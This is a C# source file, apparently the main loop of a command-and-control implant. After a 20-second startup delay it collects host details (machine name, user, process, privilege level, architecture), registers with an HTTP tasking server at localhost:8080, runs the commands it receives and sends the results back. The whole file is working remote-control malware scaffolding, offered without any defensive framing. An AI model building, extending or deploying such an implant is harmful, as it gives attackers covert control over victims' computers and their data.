﻿using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using System.Reflection;

namespace Agent
{
    internal class Program
    {
        private static AgentMetadata _metadata;
        private static CommModule _commModule;
        private static CancellationTokenSource _tokenSource;

        private static List<AgentCommand> _commands = new List<AgentCommand>();
        
        static void Main(string[] args)
        {

            Thread.Sleep(20000);
            GenerateMetadata();
            LoadAgentCommands();

            _commModule = new HttpCommModule("localhost", 8080);
            _commModule.Init(_metadata);
            _commModule.Start();

            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                if(_commModule.RecvData(out var tasks))
                {
                    HandleTasks(tasks);
                }
            }

            
        }

        private static void HandleTasks(IEnumerable<AgentTask> tasks)
        {
            foreach(var task in tasks)
            {
                HandleTask(task);
            }
        }

        private static void HandleTask(AgentTask task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command));
            if(command == null) return;

            var result = command.Execute(task);
            SendTaskResult(task.Id,result);
        }

        private static void SendTaskResult(string taskId, string result)
        {
            var taskResult = new AgentTaskResult
            {
                Id = taskId,
                Result = result
            };

            _commModule.SendData(taskResult);
        }

        private static void LoadAgentCommands()
        {
            var self = Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)))
                {
                    var instance = (AgentCommand) Activator.CreateInstance(type);
                    _commands.Add(instance);
                }
            }

                }


        public void Stop()
        {
            _tokenSource.Cancel();
        }

        public static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var username= Environment.UserName;

            string integrity = "Medium";
            if (username.Equals("SYSTEM"))
            {
                integrity = "SYSTEM";
            }

            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = "High";
                }
            }


            _metadata = new AgentMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName,
                Username = username,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86"

            };
                

        }
    }
}
